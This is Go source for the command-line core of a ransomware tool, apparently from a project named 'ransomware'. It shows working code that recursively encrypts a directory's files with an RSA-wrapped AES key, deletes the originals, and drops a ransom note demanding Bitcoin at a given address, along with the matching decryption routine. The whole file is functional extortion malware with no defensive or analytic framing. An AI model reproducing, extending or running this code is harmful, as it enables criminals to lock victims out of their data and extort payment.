package cli

import (
	"crypto/rsa"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"text/template"

	"github.com/marmos91/ransomware/crypto"
	"github.com/marmos91/ransomware/fs"
	urfavecli "github.com/urfave/cli/v2"
)

// ransomData holds the template variables for the ransom note.
type ransomData struct {
	BitcoinAddress string
	BitcoinCount   float64
	PublicKey      string
}

func loadPublicKey(path string) (*rsa.PublicKey, error) {
	pem, err := fs.ReadStringFileContent(path)
	if err != nil {
		return nil, err
	}
	return crypto.ParseRsaPublicKeyFromPemStr(pem)
}

func loadPrivateKey(path string) (*rsa.PrivateKey, error) {
	pem, err := fs.ReadStringFileContent(path)
	if err != nil {
		return nil, err
	}
	return crypto.ParseRsaPrivateKeyFromPemStr(pem)
}

// fileSize returns the size of the file at path, or 0 if it cannot be determined.
func fileSize(path string) int64 {
	info, err := os.Stat(path)
	if err != nil {
		return 0
	}
	return info.Size()
}

// processFiles applies operate to each file using parallel workers with progress
// tracking. Unless dryRun is set, originals are deleted after a successful operation.
func processFiles(files []string, workers int, dryRun bool, label string, operate func(path string) error) error {
	if len(files) == 0 {
		fmt.Fprintf(os.Stderr, "No files found for %s\n", strings.ToLower(label))
		return nil
	}

	progress := NewProgress(label, len(files))

	err := fs.ProcessFilesParallel(files, workers, func(filePath string) error {
		size := fileSize(filePath)

		if err := operate(filePath); err != nil {
			return fmt.Errorf("%s: %w", filePath, err)
		}

		if !dryRun {
			if err := fs.DeleteFileIfExists(filePath); err != nil {
				return fmt.Errorf("delete %s: %w", filePath, err)
			}
		}

		progress.Tick(filePath, size)
		return nil
	})

	progress.Summary(err != nil)
	return err
}

func Encrypt(ctx *urfavecli.Context) error {
	path := ctx.String("path")
	publicKeyPath := ctx.String("publicKey")
	addRansom := ctx.Bool("addRansom")
	ransomTemplatePath := ctx.String("ransomTemplatePath")
	ransomFileName := ctx.String("ransomFileName")
	bitcoinCount := ctx.Float64("bitcoinCount")
	bitcoinAddress := ctx.String("bitcoinAddress")
	skipHidden := ctx.Bool("skipHidden")
	dryRun := ctx.Bool("dryRun")
	recursive := ctx.Bool("recursive")
	workers := ctx.Int("workers")
	extBlacklist := splitCommaSeparated(ctx.String("extBlacklist"))
	extWhitelist := splitCommaSeparated(ctx.String("extWhitelist"))
	encSuffix := ctx.String("encSuffix")

	if addRansom && ransomTemplatePath == "" {
		return errors.New("ransomTemplatePath is required when addRansom is enabled")
	}

	absolutePath, err := filepath.Abs(path)
	if err != nil {
		return err
	}

	publicKey, err := loadPublicKey(publicKeyPath)
	if err != nil {
		return err
	}
	slog.Info("RSA public key loaded")

	plainAesKey, err := crypto.NewRandomAesKey(crypto.AES_KEY_SIZE)
	if err != nil {
		return err
	}
	slog.Debug("Generated AES session key")

	encryptedAesKey, err := crypto.RsaEncrypt(plainAesKey, publicKey)
	if err != nil {
		return err
	}

	slog.Info("Starting encryption",
		"path", absolutePath,
		"workers", workers,
		"dryRun", dryRun,
		"recursive", recursive,
		"encSuffix", encSuffix,
	)
	slog.Debug("Extension filters",
		"blacklist", extBlacklist,
		"whitelist", extWhitelist,
		"skipHidden", skipHidden,
	)
	slog.Debug("Encrypted AES key", "keySize", len(encryptedAesKey))
	slog.Debug("Ransom configuration",
		"bitcoinAddress", bitcoinAddress,
		"bitcoinCount", bitcoinCount,
		"templatePath", ransomTemplatePath,
		"fileName", ransomFileName,
	)

	files, err := fs.WalkAndCollect(absolutePath, extBlacklist, extWhitelist, skipHidden, recursive)
	if err != nil {
		return err
	}

	if err := processFiles(files, workers, dryRun, "Encrypting", func(filePath string) error {
		return encryptFile(filePath, plainAesKey, encryptedAesKey, encSuffix)
	}); err != nil {
		return err
	}

	if addRansom {
		return writeRansomNote(absolutePath, ransomFileName, ransomTemplatePath, publicKey, bitcoinAddress, bitcoinCount)
	}

	return nil
}

func Decrypt(ctx *urfavecli.Context) error {
	path := ctx.String("path")
	privateKeyPath := ctx.String("privateKey")
	dryRun := ctx.Bool("dryRun")
	skipHidden := ctx.Bool("skipHidden")
	recursive := ctx.Bool("recursive")
	workers := ctx.Int("workers")
	encSuffix := ctx.String("encSuffix")
	ransomFileName := ctx.String("ransomFileName")
	extWhitelist := []string{encSuffix}

	absolutePath, err := filepath.Abs(path)
	if err != nil {
		return err
	}

	rsaPrivateKey, err := loadPrivateKey(privateKeyPath)
	if err != nil {
		return err
	}
	slog.Info("RSA private key loaded")

	slog.Info("Starting decryption",
		"path", absolutePath,
		"workers", workers,
		"dryRun", dryRun,
		"recursive", recursive,
		"encSuffix", encSuffix,
	)
	slog.Debug("Decrypt filters",
		"whitelist", extWhitelist,
		"fileName", ransomFileName,
		"skipHidden", skipHidden,
	)

	files, err := fs.WalkAndCollect(absolutePath, nil, extWhitelist, skipHidden, recursive)
	if err != nil {
		return err
	}

	if err := processFiles(files, workers, dryRun, "Decrypting", func(filePath string) error {
		return decryptFile(filePath, rsaPrivateKey, encSuffix)
	}); err != nil {
		return err
	}

	if !dryRun {
		return fs.DeleteFileIfExists(filepath.Join(absolutePath, ransomFileName))
	}
	return nil
}

func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKey, bitcoinAddress string, bitcoinCount float64) (retErr error) {
	ransomPath := filepath.Join(dir, fileName)
	slog.Info("Adding ransom file", "path", ransomPath)

	templateAbsPath, err := filepath.Abs(templatePath)
	if err != nil {
		return err
	}

	tmpl, err := template.ParseFiles(templateAbsPath)
	if err != nil {
		return err
	}

	textPublicKey, err := crypto.ExportRsaPublicKeyAsPemStr(publicKey)
	if err != nil {
		return err
	}

	// O_EXCL fails atomically if the file already exists, avoiding a TOCTOU race.
	file, err := os.OpenFile(ransomPath, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0644)
	if errors.Is(err, os.ErrExist) {
		slog.Warn("Ransom file already exists, skipping", "path", ransomPath)
		return nil
	}
	if err != nil {
		return err
	}
	defer func() {
		if closeErr := file.Close(); retErr == nil && closeErr != nil {
			retErr = fmt.Errorf("close ransom note: %w", closeErr)
		}
	}()

	return tmpl.Execute(file, &ransomData{
		BitcoinCount:   bitcoinCount,
		BitcoinAddress: bitcoinAddress,
		PublicKey:      textPublicKey,
	})
}

func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encSuffix string) (retErr error) {
	src, err := os.Open(path)
	if err != nil {
		return err
	}
	defer func() { _ = src.Close() }()

	outPath := path + encSuffix
	dst, err := os.OpenFile(outPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer func() {
		if closeErr := dst.Close(); retErr == nil && closeErr != nil {
			retErr = fmt.Errorf("close encrypted file: %w", closeErr)
		}
		if retErr != nil {
			_ = os.Remove(outPath)
		}
	}()

	if _, err := dst.Write(encryptedAesKey); err != nil {
		return fmt.Errorf("write encrypted key: %w", err)
	}

	return crypto.AesEncryptStream(src, dst, aesKey)
}

func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) (retErr error) {
	src, err := os.Open(path)
	if err != nil {
		return err
	}
	defer func() { _ = src.Close() }()

	encryptedKey := make([]byte, rsaPrivateKey.Size())
	if _, err := io.ReadFull(src, encryptedKey); err != nil {
		return fmt.Errorf("read encrypted key: %w", err)
	}

	aesKey, err := crypto.RsaDecrypt(encryptedKey, rsaPrivateKey)
	if err != nil {
		return err
	}

	outPath := strings.TrimSuffix(path, encSuffix)
	dst, err := os.OpenFile(outPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer func() {
		if closeErr := dst.Close(); retErr == nil && closeErr != nil {
			retErr = fmt.Errorf("close decrypted file: %w", closeErr)
		}
		if retErr != nil {
			_ = os.Remove(outPath)
		}
	}()

	return crypto.AesDecryptStream(src, dst, aesKey)
}

// splitCommaSeparated splits a comma-separated string into a slice.
// Returns nil for empty or whitespace-only input. Trims whitespace from
// each token and drops empty entries to handle inputs like ".txt, .doc"
// or trailing commas like ".txt,".
func splitCommaSeparated(s string) []string {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil
	}

	parts := strings.Split(s, ",")
	result := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			result = append(result, p)
		}
	}
	if len(result) == 0 {
		return nil
	}
	return result
}
